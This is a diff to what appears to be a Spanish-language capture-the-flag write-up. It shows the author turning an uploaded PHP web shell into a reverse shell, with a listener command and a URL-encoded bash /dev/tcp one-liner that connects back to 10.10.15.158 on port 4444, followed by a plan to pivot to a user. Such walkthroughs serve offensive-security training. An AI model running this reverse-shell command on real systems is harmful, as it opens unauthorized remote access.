@@ -131,5 +131,19 @@ Ahora accederemos a donde se almacena los fichero en `/files/shell.php` y vemos 
 ![[Pasted image 20260317111343.png]]
 
 Tenemos una WebShell, vamos a convertirlo en una ReverseShell
+Primero tendremos que monernos en escucha
+```shell
+penelope -p 4444
+```
+
+Y en la web shell nos mandamos una bash con curl
+```shell
+bash -c 'bash -i >%26 %2Fdev%2Ftcp%2F10.10.15.158%2F4444 0>%261'
+```
+
+Obteniendo la ReverseShell
+
+En el `home` de la aplicacion encontramos un usuario llamdo `steve` vamos a intentar pivotar a el
+
 
 
